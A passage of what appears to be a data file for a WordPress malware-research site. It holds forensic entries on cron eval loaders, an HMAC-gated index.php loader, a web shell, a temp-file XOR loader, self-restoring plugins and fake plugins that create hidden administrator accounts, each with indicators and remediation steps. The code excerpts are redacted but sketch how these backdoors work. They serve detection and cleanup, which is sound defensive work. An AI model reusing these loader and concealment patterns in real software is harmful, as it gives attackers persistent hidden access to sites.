      "0 * * * * /usr/local/bin/php -r '\n  eval(gzinflate(base64_decode(\"[REDACTED ENCODED PAYLOAD]\")));\n'",
    high: [
      "/usr/local/bin/php -r with the nested eval wrapper",
      "Hourly 0 * * * * schedule",
      "The exact wrapper stored as a cron command",
    ],
    contextual: ["Cron job", "base64_decode()", "gzinflate()", "eval()"],
    remediation: [
      "Preserve the cron entry and full payload privately.",
      "Remove the unauthorized scheduler entry and review all user and system cron locations.",
      "Search files and logs for artifacts created around the hourly execution time.",
      "Rotate hosting credentials if cron access was unauthorized.",
    ],
    recurrence: [
      "Re-list cPanel and shell crontabs after cleanup.",
      "Monitor process and file changes around the top of each hour.",
      "Confirm the encoded wrapper and related tasks do not return.",
    ],
    related: [
      "wp-config-xor-temporary-file-loader",
      "xdiff-temporary-file-php-loader",
      "system-control-hidden-backup-restoration",
    ],
    guides: [cronGuide, malwareGuide],
    cases: [],
  },
  {
    file: "php-malware-index.md",
    title: "TokensDeGuards index.php Inflated eval Loader Research",
    h1: "TokensDeGuards Payload Verification and eval in index.php",
    slug: "tokensdeguards-index-php-loader",
    description:
      "Forensic review of an index.php class that checked a keyed message, inflated its payload, and passed the result to eval.",
    reportDate: "2026-02-03",
    category: "Authenticated compressed PHP loader",
    components: ["WordPress root index.php", "Compressed PHP payload handling"],
    locations: ["Root index.php in an anonymized client site"],
    behaviors: [
      "Processes a keyed message and tag",
      "Recomputes and compares a keyed hash",
      "Inflates a payload with gzinflate",
      "Passes the inflated value to eval",
    ],
    confidence: "High",
    severity: "Critical",
    rationale:
      "The screenshot directly shows integrity checking, gzinflate, and eval. Client-identifying header text is removed in a privacy-safe crop.",
    evidence:
      "Anonymized investigation with one code screenshot and retained index.php excerpt",
    images: [
      {
        file: "malware-index.php_evidence-safe.png",
        alt: "Cropped PHP editor view showing HMAC verification, gzinflate, and eval in index.php",
        caption:
          "The privacy-safe crop shows the payload-verification branch, gzinflate call, and eval without the client domain visible in the original editor header.",
        supports:
          "index.php verified, inflated, and evaluated an embedded message",
      },
    ],
    confirmed: [
      "The visible code recalculates a keyed hash over a version and message.",
      "It rejects a tag that fails hash_equals.",
      "It calls gzinflate on the payload and evaluates the resulting value.",
      "The identifier PayloadCodecsException appears in error handling.",
    ],
    assessment:
      "The keyed check suggests the loader only evaluates payloads with a matching message tag. The evidence does not show where the message originated or the behavior of the inflated body.",
    unknown: [
      "The inflated payload is not published.",
      "The screenshot does not prove the eval branch ran.",
      "The initial compromise method, message source, and visitor outcome were not established.",
      "The original screenshot is excluded because it displayed a client domain.",
    ],
    heading: "How verification precedes payload inflation",
    excerptLang: "php",
    excerpt:
      "$expected = substr(hash_hmac(/* algorithm and key redacted */), 0, strlen($tag));\nif (!hash_equals($tag, $expected)) throw new Exception('verification failed');\n$decoded = gzinflate($payload);\neval($decoded); // embedded message omitted",
    high: [
      "TokensDeGuards",
      "PayloadCodecsException",
      "Keyed tag verification followed by gzinflate and eval",
    ],
    contextual: ["index.php", "hash_hmac()", "hash_equals()", "eval()"],
    remediation: [
      "Preserve the full index.php and message material privately.",
      "Replace index.php with the clean WordPress front controller.",
      "Search for TokensDeGuards, PayloadCodecsException, and the verification-to-eval sequence.",
      "Review adjacent files and persistence mechanisms.",
    ],
    recurrence: [
      "Verify index.php remains identical to the trusted copy.",
      "Repeat the class-name and exception-name search.",
      "Monitor root files for recreation after traffic and cron tasks.",
    ],
    related: [
      "goto-obfuscated-index-php-loader",
      "privdayz-obfuscated-index-php",
      "wp-security-fake-plugin-eval-loader",
    ],
    guides: [obfuscationGuide, malwareGuide],
    cases: [
      guide(
        "Regenerating index.php malware case study",
        "/case-studies/case-study-fix-regenerating-index-php-malware-wordpress/",
      ),
    ],
  },
  {
    file: "php-shell-ultimate-backdoor.md",
    title: "PHP Shell Ultimate Artifact and Installer Claims Research",
    h1: "PHP Shell Ultimate Artifact Found Among Upload-Like Folders",
    slug: "php-shell-ultimate-artifact",
    description:
      "Forensic review of a PHP Shell Ultimate sample containing named installer, command, file, and bypass-related functions.",
    reportDate: "2026-01-27",
    category: "PHP web-shell artifact",
    components: [
      "Unexpected PHP files in writable directories",
      "Browser-accessible PHP shell interface",
    ],
    locations: [
      "Observed nasa-custom-fonts directory tree",
      "ai.php and asem.php shown in a subdirectory",
    ],
    behaviors: [
      "Declares PHP SHELL ULTIMATE in source",
      "Defines bypass_disable_functions and bypass_open_basedir functions",
      "Contains command and generated-shell branches in the private sample",
    ],
    confidence: "High",
    severity: "Critical",
    rationale:
      "The source identity and dangerous function set are visible. Labels such as PHP-FPM Bypass do not prove the technique succeeded on the investigated server.",
    evidence:
      "Anonymized investigation with five screenshots and retained truncated ai.php source; privacy-sensitive and redundant images are excluded",
    images: [
      {
        file: "php-shell-ultimate-bypass-installer_evidence-3.png",
        alt: "PHP editor showing the PHP Shell Ultimate header and bypass-named functions",
        caption:
          "The source identifies itself as PHP SHELL ULTIMATE and lists LD_PRELOAD, PHP-FPM, and ImageMagick labels. The labels do not demonstrate a successful bypass.",
        supports:
          "The observed file contained PHP Shell Ultimate identity and bypass-named functions",
      },
      {
        file: "php-shell-ultimate-bypass-installer_evidence-4.png",
        alt: "File manager showing ai.php and asem.php in a writable plugin-related folder",
        caption:
          "The directory contains ai.php, asem.php, index.php, and .htaccess. Presence confirms the artifacts, while contents and execution require separate verification.",
        supports:
          "ai.php and related PHP files existed in the observed directory",
      },
    ],
    confirmed: [
      "The source header names PHP SHELL ULTIMATE.",
      "Functions include bypass_disable_functions, bypass_open_basedir, encode_output, decode_input, and generate_shell_code.",
      "A directory screenshot shows ai.php and asem.php beside index.php and .htaccess.",
      "The retained sample includes command-handling code but is not published in operational form.",
    ],
    assessment:
      "The file is a web-shell artifact with installer and command-oriented code. The names of bypass methods are claims made by the code; success against server restrictions was not observed.",
    unknown: [
      "No request log proves the shell was accessed.",
      "No command execution, privilege level, or successful security bypass was observed.",
      "The initial upload path and any plugin vulnerability were not confirmed.",
      "The original account-path screenshot is excluded for privacy.",
    ],
    heading: "Why function labels are evidence but not proof of success",
    excerptLang: "php",
    excerpt:
      "function bypass_disable_functions() {\n    return ['LD_PRELOAD Method', 'PHP-FPM Bypass', 'ImageMagick Exploit'];\n}\nfunction generate_shell_code() {\n    return '[REDACTED GENERATED SHELL]';\n}",
    high: [
      "PHP SHELL ULTIMATE - Auto Install & Bypass Protection",
      "bypass_disable_functions",
      "bypass_open_basedir",
      "generate_shell_code",
      "ai.php and asem.php together",
    ],
    contextual: [
      "ai.php",
      "system()",
      "base64_decode()",
      "uploads or custom-font directories",
    ],
    remediation: [
      "Preserve the files and access logs privately.",
      "Remove all confirmed shell files and inspect the containing directory for related artifacts.",
      "Search for the distinctive title and function names across the account.",
      "Rotate credentials and review administrator accounts after containment.",
    ],
    recurrence: [
      "Confirm ai.php, asem.php, and similarly named copies do not return.",
      "Monitor writable directories for new PHP files.",
      "Review access logs for direct requests to the observed filenames.",
    ],
    related: [
      "savvywolf-manager-php-web-shell",
      "xdiff-temporary-file-php-loader",
      "privdayz-obfuscated-index-php",
    ],
    guides: [hiddenBackdoorGuide, malwareGuide],
    cases: [
      guide(
        "Tiny File Manager backdoor case study",
        "/case-studies/siteground-malware-detected-suspension-tiny-file-manager-backdoor/",
      ),
    ],
  },
  {
    file: "recursive-php-htaccess-denial.md",
    title: "Mixed-Case PHP .htaccess Deny Rule Research",
    h1: "Mixed-Case PHP Deny Rule with an index.php Exception",
    slug: "mixed-case-php-htaccess-deny-rule",
    description:
      "Forensic analysis of a FilesMatch rule covering mixed-case PHP extensions while allowing only index.php through a second rule.",
    reportDate: "2026-01-27",
    category: "Restrictive .htaccess access control",
    components: [
      "Apache FilesMatch configuration",
      "Direct PHP request handling",
    ],
    locations: ["Observed .htaccess file; exact directory scope not retained"],
    behaviors: [
      "Denies a broad mixed-case extension list",
      "Includes the suspected extension",
      "Allows index.php through a second FilesMatch rule",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The screenshot directly shows the restrictive rule. Claims that it was recursively placed in every directory or caused specific errors are removed because that scope was not retained.",
    evidence:
      "Anonymized investigation with one code screenshot and a supplied .htaccess excerpt",
    images: [
      {
        file: "htaccess-php-lockout_evidence-1.png",
        alt: "Editor showing mixed-case PHP FilesMatch denial and an index.php allow rule",
        caption:
          "The rule denies many PHP capitalization variants and then allows index.php. The image confirms this file's contents, not recursive placement or the cause of a particular error page.",
        supports:
          "The observed .htaccess contained a broad PHP deny rule and index.php exception",
      },
    ],
    confirmed: [
      "The first FilesMatch pattern includes php, PHP, Php, PHp, pHp, pHP, phP, PhP, php5, php7, php8, and suspected.",
      "The first block uses Deny from all.",
      "A second FilesMatch block allows index.php.",
    ],
    assessment:
      "The combination can block direct access to many PHP files while leaving index.php reachable. This could be used for access control abuse, but the repository does not prove recursive distribution or the exact server effect.",
    unknown: [
      "The number and locations of copies were not retained.",
      "The evidence does not identify the process that wrote the rule.",
      "No server log ties a specific 403 or 500 response to this file.",
      "No associated dropper was confirmed.",
    ],
    heading: "How the index.php exception changes the rule",
    excerptLang: "apache",
    excerpt:
      "<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|php7|php8|suspected)$'>\n  Deny from all\n</FilesMatch>\n<FilesMatch '^(index.php)$'>\n  Allow from all\n</FilesMatch>",
    high: [
      "Mixed-case PHP extension sequence",
      "suspected extension in FilesMatch",
      "Broad deny followed by index.php-only allow",
    ],
    contextual: [".htaccess", "FilesMatch", "403 response", "index.php"],
    remediation: [
      "Preserve representative configuration and record its path.",
      "Replace malicious rules with directory-appropriate trusted configuration.",
      "Search recursively for the exact mixed-case sequence.",
      "Investigate any files that the exception continued to expose.",
    ],
    recurrence: [
      "Repeat the recursive rule search after scheduled tasks.",
      "Confirm expected PHP endpoints behave normally under clean configuration.",
      "Monitor .htaccess creation in writable directories.",
    ],
    related: [
      "htaccess-php-allowlist-injection",
      "cookie-indexed-php-loader-htaccess-file",
      "goto-obfuscated-index-php-loader",
    ],
    guides: [htaccessGuide, malwareGuide],
    cases: [],
  },
  {
    file: "seo-spam-anchor-css-injection.md",
    title: "M6bMm64 Hidden Anchor CSS Injection Research",
    h1: "M6bMm64 Hidden Anchor and Off-Screen CSS in post_content",
    slug: "m6bmm64-hidden-anchor-injection",
    description:
      "Forensic review of a database-stored anchor, distinctive div ID, and JavaScript-generated CSS positioning the element far off screen.",
    reportDate: "2026-01-15",
    category: "Database-stored hidden-link injection",
    components: [
      "WordPress post content",
      "Injected anchor markup",
      "JavaScript-generated CSS",
    ],
    locations: ["post_content database field"],
    behaviors: [
      "Adds an external anchor inside a distinctive div",
      "Creates a style element with JavaScript",
      "Positions the div at a very large negative top value",
    ],
    confidence: "High",
    severity: "Medium",
    rationale:
      "The database screenshot directly shows the anchor and hiding CSS. A privacy-safe crop removes the database identifier from the original image.",
    evidence:
      "Anonymized investigation with one database screenshot and supplied HTML/JavaScript sample",
    images: [
      {
        file: "db-spam-malware_evidence-safe.png",
        alt: "Cropped post_content field showing the M6bMm64 anchor and off-screen CSS injection",
        caption:
          "The privacy-safe crop shows the external anchor, M6bMm64 element ID, and top:-152413851px rule without the client database identifier.",
        supports: "The hidden-link injection was stored in post_content",
      },
    ],
    confirmed: [
      "The post_content field contains div ID M6bMm64IekltUmnGh3vrm9.",
      "The div includes an anchor to andrikofarmakeio[.]com.",
      "The script creates a style element and sets top:-152413851px with fixed positioning.",
    ],
    assessment:
      "The extreme negative position is consistent with hiding the link from ordinary view while leaving it in the document. Search-engine treatment and ranking effects are not measured here.",
    unknown: [
      "The initial database write path was not identified.",
      "The evidence does not establish search ranking impact, visitor clicks, or the number of affected records.",
      "No vulnerable plugin, theme, or version was confirmed.",
    ],
    heading: "How the injected CSS moves the link off screen",
    excerptLang: "html",
    excerpt:
      '<div id="M6bMm64IekltUmnGh3vrm9">\n  <a href="hxxps://andrikofarmakeio[.]com/">[anchor text]</a>\n</div>\n<script>/* creates CSS with top:-152413851px; remaining code shortened */</script>',
    high: [
      "M6bMm64IekltUmnGh3vrm9",
      "oeYR5CtKOu7Yvb",
      "andrikofarmakeio[.]com",
      "top:-152413851px",
    ],
    contextual: [
      "post_content",
      "position:fixed",
      "createElement('style')",
      "External anchor",
    ],
    remediation: [
      "Export the affected content record before editing.",
      "Remove the injected block and inspect revisions and duplicates.",
      "Search the database for the div ID, function name, domain, and extreme top value.",
      "Review the write path and privileged activity where logs permit.",
    ],
    recurrence: [
      "Repeat the identifier search after content edits and cron events.",
      "Inspect rendered HTML for the hidden div.",
      "Monitor affected records for unauthorized changes.",
    ],
    related: [
      "database-fetch-spam-injection",
      "ushort-company-post-content-redirect",
      "hide-hidden-posts-mu-plugin",
    ],
    guides: [
      guide(
        "Hidden links malware guide",
        "/blog/hidden-links-malware-the-simple-guide-to-seo-spam-detection-cleanup-and-prevention/",
      ),
      databaseGuide,
    ],
    cases: [
      guide(
        "Remove spam URLs case study",
        "/case-studies/remove-spam-urls-from-google/",
      ),
    ],
  },
  {
    file: "wordpress-backdoor-exploit.md",
    title: "xdiff.php XOR Temporary-File Loader Research",
    h1: "xdiff.php XOR Loader Using Writable Temporary Directories",
    slug: "xdiff-temporary-file-php-loader",
    description:
      "Forensic analysis of xdiff.php code that decoded request data, searched writable temporary paths, included a staged file, and deleted it.",
    reportDate: "2026-02-01",
    category: "Request-gated temporary-file PHP loader",
    components: [
      "Standalone PHP backdoor file",
      "Server temporary directories",
    ],
    locations: [
      "xdiff.php; exact deployed plugin path not retained",
      "/var/tmp, /dev/shm, /tmp, and configured temporary paths",
    ],
    behaviors: [
      "Checks for a POST request field",
      "Converts hex input and applies XOR",
      "Selects a writable temporary directory",
      "Writes .data_chunk, includes it, and deletes it",
    ],
    confidence: "High",
    severity: "Critical",
    rationale:
      "The supplied xdiff.php source directly shows request decoding, temporary-file inclusion, and cleanup. Operational parameter names and full request instructions are withheld.",
    evidence:
      "Anonymized investigation with two code screenshots and supplied sources for xdiff.php and a separate command backdoor; no screenshot is published for code-safety reasons",
    images: [],
    confirmed: [
      "xdiff.php checks for a POST field.",
      "It hex-decodes request input and XOR-transforms each byte.",
      "It iterates through configured and conventional temporary directories.",
      "It writes .data_chunk, includes the file, unlinks it, and exits.",
    ],
    assessment:
      "The behavior is a transient PHP loader: request-supplied code can be staged outside the webroot, executed through include, and removed. The separate sadtab_chpw.php command backdoor was supplied in the same draft, but their direct relationship was not confirmed.",
    unknown: [
      "No triggering request or executed payload was retained.",
      "The exact deployed plugin path was not confirmed.",
      "The relationship to sadtab_chpw.php was not established.",
      "The initial compromise method and vulnerable component were not identified.",
    ],
    heading: "How the loader selects and cleans a temporary path",
    excerptLang: "php",
    excerpt:
      "$paths = ['/var/tmp', ini_get('upload_tmp_dir'), '/dev/shm', sys_get_temp_dir(), '/tmp'];\n$decoded = xor_bytes(hex2bin($_POST['[REDACTED]']), 36);\n// choose a writable path\nfile_put_contents($tempFile, $decoded);\ninclude $tempFile;\nunlink($tempFile);",
    high: [
      "xdiff.php",
      ".data_chunk",
      "Writable-path loop followed by include and unlink",
      "Hex decode plus XOR 36",
    ],
    contextual: ["/tmp", "/dev/shm", "file_put_contents()", "include()"],
    remediation: [
      "Preserve xdiff.php and relevant request logs privately.",
      "Remove the loader and search every writable path for related temporary artifacts.",
      "Search for .data_chunk and the writable-directory array.",
      "Rotate credentials and review other access paths after containment.",
    ],
    recurrence: [
      "Confirm xdiff.php and .data_chunk do not return.",
      "Monitor temporary directories and web paths for short-lived PHP files.",
      "Review logs for repeated requests to the observed filename.",
    ],
    related: [
      "cookie-indexed-php-loader-htaccess-file",
      "wp-config-xor-temporary-file-loader",
      "php-shell-ultimate-artifact",
    ],
    guides: [hiddenBackdoorGuide, malwareGuide],
    cases: [],
  },
  {
    file: "wordpress-fake-system-control-plugin-mu-plugin-backdoor.md",
    title: "system-control Hidden-Backup Restoration Research",
    h1: "system-control Plugin Restored from wp-content/.sc-backup",
    slug: "system-control-hidden-backup-restoration",
    description:
      "Forensic analysis of sc-loader.php restoring and reactivating a system-control plugin from a hidden wp-content backup path.",
    reportDate: "2026-04-22",
    category: "Self-restoring fake plugin persistence",
    components: [
      "WordPress plugin lifecycle",
      "Hidden wp-content backup",
      "MU-plugin persistence",
    ],
    locations: [
      "wp-content/plugins/system-control/",
      "wp-content/.sc-backup/system-control/",
      "wp-content/mu-plugins/sc-loader.php",
    ],
    behaviors: [
      "Copies system-control from a hidden backup when missing",
      "Reactivates the plugin when inactive",
      "Filters plugin actions to resist deletion or deactivation",
      "Coexists with additional MU-plugin access artifacts in the retained incident",
    ],
    confidence: "High",
    severity: "Critical",
    rationale:
      "The loader source and filesystem screenshots directly show the restoration source, plugin destination, and MU-plugin files. Full remote-management and account-reset code is kept private.",
    evidence:
      "Anonymized multi-artifact investigation with nine screenshots and retained sc-loader.php, system-control.php, MU-plugin, and theme samples",
    images: [
      {
        file: "malware-inside-mu-plugins-themes-plugins_evidence-1.png",
        alt: "File manager showing system-control inside wp-content slash .sc-backup",
        caption:
          "The hidden .sc-backup directory contains system-control, matching the restoration path in sc-loader.php.",
        supports:
          "A hidden system-control backup existed at the loader's source path",
      },
      {
        file: "malware-inside-mu-plugins-themes-plugins_evidence-7.png",
        alt: "MU-plugin directory showing sc-loader.php and other suspicious PHP files",
        caption:
          "The MU-plugin directory contains sc-loader.php, site-compat-layer.php, test-mu-plugin.php, and WordPressSecureMode.php. The listing confirms co-location, while each behavior requires its own code evidence.",
        supports:
          "sc-loader.php and additional access artifacts existed under mu-plugins",
      },
      {
        file: "malware-inside-mu-plugins-themes-plugins_evidence-9.png",
        alt: "WordPress plugins directory showing the system-control folder",
        caption:
          "The normal plugin directory contains system-control, the destination that sc-loader.php restores and reactivates.",
        supports: "The system-control destination plugin directory existed",
      },
    ],
    confirmed: [
      "sc-loader.php defines wp-content/plugins/system-control as the destination.",
      "It defines wp-content/.sc-backup/system-control as the backup source.",
      "The code copies from the backup when the destination is absent and calls activate_plugin.",
      "The screenshots show the source, destination, and sc-loader.php under mu-plugins.",
    ],
    assessment:
      "The source and destination evidence establish self-restoring plugin persistence. Casino and fake-CAPTCHA screenshots occurred in the same investigation, but this page does not claim the loader alone produced those symptoms.",
    unknown: [
      "The initial compromise method was not confirmed.",
      "The relationship between each generated theme directory and system-control was not individually established.",
      "Visitor-facing spam screenshots do not identify which component rendered the content.",
      "Operational request triggers, credentials, secrets, and complete backdoor code are withheld.",
    ],
    heading: "How sc-loader.php restores the plugin",
    excerptLang: "php",
    excerpt:
      "$pluginDir = WP_PLUGIN_DIR . '/system-control';\n$backupDir = WP_CONTENT_DIR . '/.sc-backup/system-control';\nif (destination_missing() && is_dir($backupDir)) {\n    copy_directory($backupDir, $pluginDir);\n    activate_plugin('system-control/system-control.php');\n}\n// deletion resistance and helper implementation shortened",
    high: [
      "wp-content/.sc-backup/system-control",
      "sc-loader.php",
      "system-control/system-control.php",
      "Copy-then-activate persistence flow",
    ],
    contextual: [
      "plugins_loaded",
      "activate_plugin()",
      "MU plugin",
      "Generated theme directory names",
    ],
    remediation: [
      "Preserve the source, destination, loader, and related MU-plugin files.",
      "Remove sc-loader.php before deleting both system-control copies so the loader cannot restore them.",
      "Review every MU plugin, administrator account, cron job, and generated directory in the same incident.",
      "Replace compromised themes and plugins with trusted copies and rotate credentials.",
    ],
    recurrence: [
      "Confirm both system-control paths remain absent.",
      "Monitor wp-content for recreation of .sc-backup and sc-loader.php.",
      "Verify the plugin list and filesystem remain consistent after requests and scheduled tasks.",
    ],
    related: [
      "media-patcher-lab-mu-plugin",
      "statemesh-mu-plugin-self-copy",
      "wp-user-query-hidden-admin-filter",
    ],
    guides: [
      guide(
        "Why WordPress malware keeps returning",
        "/blog/why-wordpress-malware-keeps-coming-back-and-how-to-stop-it-forever/",
      ),
      hiddenBackdoorGuide,
    ],
    cases: [
      guide(
        "Regenerating system-control malware case study",
        "/case-studies/regenerating-wordpress-malware-system-control-case-study/",
      ),
    ],
  },
  {
    file: "wordpress-mu-plugin-hidden-admin-backdoor.md",
    title: "wp-user-query.php Hidden Administrator Filter Research",
    h1: "wp-user-query.php MU-Plugin Concealing a Stored User ID",
    slug: "wp-user-query-hidden-admin-filter",
    description:
      "Forensic analysis of an MU-plugin using _pre_user_id with pre_get_users, pre_user_query, and views_users to conceal an account.",
    reportDate: "2026-04-23",
    category: "MU-plugin hidden-user concealment",
    components: [
      "WordPress MU plugins",
      "Administrator user queries",
      "User count views",
    ],
    locations: [
      "wp-content/mu-plugins/wp-user-query.php",
      "wp-content/mu-plugins/loader-optimization.php",
      "WordPress option _pre_user_id",
    ],
    behaviors: [
      "Excludes a stored user ID through pre_get_users",
      "Appends a user-ID exclusion through pre_user_query",
      "Adjusts user-view counts",
      "Coexists with a separate request-gated MU-plugin loader",
    ],
    confidence: "High",
    severity: "Critical",
    rationale:
      "The visible wp-user-query.php code directly conceals a stored ID. A separate screenshot exposes a live gate token and is excluded; only its non-operational structure is summarized.",
    evidence:
      "Anonymized investigation with four screenshots and representative wp-user-query.php plus loader-optimization.php excerpts",
    images: [
      {
        file: "mu-plugins-malware_evidence-1.png",
        alt: "WordPress file editor showing wp-user-query.php excluding _pre_user_id from user queries",
        caption:
          "The visible MU-plugin reads _pre_user_id and applies user-query exclusions. This is direct evidence of concealment logic.",
        supports: "wp-user-query.php concealed the stored user ID",
      },
      {
        file: "mu-plugins-malware_evidence-2.png",
        alt: "WordPress file manager showing three suspicious files in mu-plugins",
        caption:
          "The directory lists health-check.php, loader-optimization.php, and wp-user-query.php together under mu-plugins. Co-location does not by itself prove every file's behavior.",
        supports: "Multiple suspicious MU-plugin artifacts were present",
      },
      {
        file: "mu-plugins-malware_evidence-4.png",
        alt: "WordPress Users screen showing inconsistent All and 2FA Inactive counts",
        caption:
          "The visible counts are inconsistent. This is contextual corroboration only; the code provides the direct evidence of account filtering.",
        supports:
          "The administrator interface displayed a count mismatch consistent with filtering",
      },
    ],
    confirmed: [
      "wp-user-query.php reads _pre_user_id.",
      "It hooks pre_get_users, pre_user_query, and views_users.",
      "The code excludes the stored ID from listings and adjusts counts.",
      "A separate loader-optimization.php file was present in the same MU-plugin directory.",
    ],
    assessment:
      "The code is designed to conceal one stored user ID from administrator review. The count mismatch is consistent with that behavior but would not be sufficient evidence on its own.",
    unknown: [
      "The retained evidence does not identify how the files were introduced.",
      "No vulnerable component or affected version was confirmed.",
      "The excluded loader screenshot contains a live hard-coded token.",
      "No request log proves the gated loader was used.",
    ],
    heading: "How _pre_user_id moves through three user-view hooks",
    excerptLang: "php",
    excerpt:
      "$id = get_option('_pre_user_id');\nadd_action('pre_get_users', function ($query) use ($id) {\n    $query->set('exclude', /* existing exclusions plus $id */);\n});\nadd_action('pre_user_query', /* SQL exclusion shortened */);\nadd_filter('views_users', /* count adjustment shortened */);",
    high: [
      "wp-user-query.php",
      "WP User Query Filter v3",
      "_pre_user_id",
      "pre_get_users plus pre_user_query plus views_users",
    ],
    contextual: [
      "mu-plugins",
      "User-count mismatch",
      "loader-optimization.php",
      "health-check.php",
    ],
    remediation: [
      "Preserve the MU-plugin directory and database option.",
      "Remove the concealment and loader files after confirming they are not authorized.",
      "Audit wp_users and wp_usermeta directly rather than trusting the filtered interface.",
      "Remove unauthorized accounts, invalidate sessions, and rotate credentials.",
    ],
    recurrence: [
      "Confirm wp-admin and direct database user inventories agree.",
      "Monitor mu-plugins and _pre_user_id for recreation.",
      "Review logs for requests to the removed loader path where available.",
    ],
    related: [
      "functions-php-hidden-admin-query-backdoor",
      "wp-compatibility-patch-hidden-admin",
      "statemesh-mu-plugin-self-copy",
    ],
    guides: [hiddenAdminGuide, hiddenBackdoorGuide],
    cases: [
      guide(
        "MU-plugin hidden-user case study",
        "/case-studies/bitdefender-blocked-wordpress-no-users-found-mu-plugin-malware/",
      ),
    ],
  },
  {
    file: "wordpress-plugin-keeps-getting-removed-or-deactivated-malware.md",
    title: "media-patcher-lab.php MU-Plugin Persistence Research",
    h1: "media-patcher-lab.php Found in WordPress mu-plugins",
    slug: "media-patcher-lab-mu-plugin",
    description:
      "Forensic review of a media-patcher-lab.php MU-plugin artifact associated with obfuscated plugin-management code and transient loaders.",
    reportDate: "2026-04-23",
    category: "Fake MU-plugin with plugin tampering",
    components: [
      "WordPress MU-plugin loader",
      "Plugin-management functions",
      "Transient PHP loader family",
    ],
    locations: [
      "wp-content/mu-plugins/media-patcher-lab.php",
      "Representative menu-queue-bit.php component",
    ],
    behaviors: [
      "Autoloads from the MU-plugin directory",
      "Uses a benign-looking Media Patcher Lab identity",
      "Related retained code resolves WordPress plugin-management functions",
      "Related transient loaders stage request data in temporary files",
    ],
    confidence: "Medium",
    severity: "Critical",
    rationale:
      "The screenshot proves the MU-plugin artifact. Representative code supports plugin-management and loader behavior, but the screenshot of Amelia does not prove that this file removed that plugin.",
    evidence:
      "Anonymized investigation with two screenshots and representative fake-plugin plus transient-loader samples",
    images: [
      {
        file: "Amelia-plugins-removing-automatically-because-of-the-malware_evidence-2.png",
        alt: "Hosting file manager showing media-patcher-lab.php in wp-content slash mu-plugins",
        caption:
          "The file manager confirms media-patcher-lab.php beside hosting-provider MU plugins. The screenshot does not prove which legitimate plugin, if any, it altered.",
        supports: "media-patcher-lab.php existed in the MU-plugin directory",
      },
    ],
    confirmed: [
      "media-patcher-lab.php was present under wp-content/mu-plugins.",
      "The representative sample uses a fake plugin identity.",
      "Related retained strings resolve WordPress plugin-management functions.",
      "Separate small samples stage decoded request data in temporary PHP files and then delete them.",
    ],
    assessment:
      "The combined artifacts are consistent with persistent plugin tampering and redundant access. The reported Amelia symptom is plausible context, but no retained event log directly links media-patcher-lab.php to removal of Amelia.",
    unknown: [
      "The evidence does not establish an Amelia vulnerability.",
      "The Plugins-screen screenshot is excluded because it shows only the plugin state, not the removal mechanism.",
      "The initial compromise method and exact relationship among all representative files were not confirmed.",
      "Operational request parameters and complete loaders are withheld.",
    ],
    heading: "Why the MU-plugin location matters more than the symptom",
    excerptLang: "php",
    excerpt:
      "/** Plugin Name: Media Patcher Lab */\n// obfuscated string table resolves plugin-management functions\n$targets = request_plugin_identifiers();\nforeach ($targets as $plugin) {\n    inspect_or_change_plugin_state($plugin);\n}\n// request names and destructive helper bodies redacted",
    high: [
      "media-patcher-lab.php",
      "Media Patcher Lab identity in mu-plugins",
      "menu-queue-bit.php / Dev Scanner Ink in related evidence",
    ],
    contextual: [
      "mu-plugins",
      "deactivate_plugins()",
      "active_plugins option",
      "A legitimate plugin failing to remain active",
    ],
    remediation: [
      "Preserve the MU-plugin and representative related files.",
      "Remove untrusted MU plugins before reinstalling affected legitimate plugins.",
      "Review active_plugins and related options after file cleanup.",
      "Search for the fake identities and transient-loader structure across the account.",
    ],
    recurrence: [
      "Confirm media-patcher-lab.php does not return.",
      "Monitor plugin state and MU-plugin filesystem changes together.",
      "Verify legitimate plugins remain stable after malicious persistence is removed.",
    ],
    related: [
      "menu-queue-bit-compact-extension-vox",
      "system-control-hidden-backup-restoration",
      "statemesh-mu-plugin-self-copy",
    ],
    guides: [
      guide(
        "Why WordPress malware keeps returning",
        "/blog/why-wordpress-malware-keeps-coming-back-and-how-to-stop-it-forever/",
      ),
      hiddenBackdoorGuide,
    ],
    cases: [],
  },
  {
    file: "wp-compatibility-patch-backdoor.md",
    title: "WP Compatibility Patch Hidden-Admin Plugin Research",
    h1: "WP Compatibility Patch Plugin Creating and Hiding an Administrator",
    slug: "wp-compatibility-patch-hidden-admin",
    description:
      "Forensic analysis of a fake WP Compatibility Patch plugin using _pre_user_id to create, conceal, and protect an administrator account.",
    reportDate: "2026-01-14",
    category: "Fake plugin hidden administrator",
    components: [
      "WordPress plugin loader",
      "Administrator accounts",
      "User-query filters",
    ],
    locations: [
      "wp-content/plugins/wp-compatibility-patch/",
      "WordPress option _pre_user_id",
    ],
    behaviors: [
      "Creates or resets a named administrator",
      "Stores the user ID in _pre_user_id",
      "Excludes the user from admin queries",
      "Hides or protects the plugin and account through WordPress hooks",
    ],
    confidence: "High",
    severity: "Critical",
    rationale:
      "The supplied code directly shows account creation, password reset, role assignment, stored-ID concealment, and a deceptive plugin identity. Credentials are redacted.",
    evidence:
      "Anonymized investigation with a retained WP Compatibility Patch sample and no publishable screenshot",
    images: [],
    confirmed: [
      "The plugin header identifies WP Compatibility Patch.",
      "The bootstrap function uses wp_insert_user or updates an existing named account.",
      "The role is administrator and the ID is stored under _pre_user_id.",
      "pre_user_query excludes that ID from administrator listings.",
    ],
    assessment:
      "The artifact is a fake compatibility plugin implementing persistent hidden administrator access. It overlaps a broad existing article, so this research entry is limited to exact plugin identifiers and code behavior.",
    unknown: [
      "The hard-coded password and email are not published.",
      "The evidence does not establish how the plugin was installed.",
      "No vulnerable component, affected version, prevalence, or successful attacker login was confirmed.",
    ],
    heading: "How the plugin ties account creation to concealment",
    excerptLang: "php",
    excerpt:
      "/** Plugin Name: WP Compatibility Patch */\n$params = ['user_login' => 'adminbackup', 'role' => 'administrator'];\n// credential and email removed\n$id = wp_insert_user($params);\nupdate_option('_pre_user_id', $id);\n// query exclusion and plugin-hiding details shortened",
    high: [
      "WP Compatibility Patch",
      "wpc_patch_bootstrap",
      "adminbackup",
      "_pre_user_id",
      "Plugin identity plus create-and-hide flow",
    ],
    contextual: [
      "wp_insert_user()",
      "pre_user_query",
      "administrator role",
      "Compatibility-themed plugin name",
    ],
    remediation: [
      "Preserve the plugin directory and account records.",
      "Remove the fake plugin and inspect users directly in the database or CLI.",
      "Remove unauthorized accounts and the malicious option after recording their relationship.",
      "Rotate credentials and invalidate sessions.",
    ],
    recurrence: [
      "Confirm the directory, account, and _pre_user_id do not return.",
      "Compare direct database and wp-admin user inventories.",
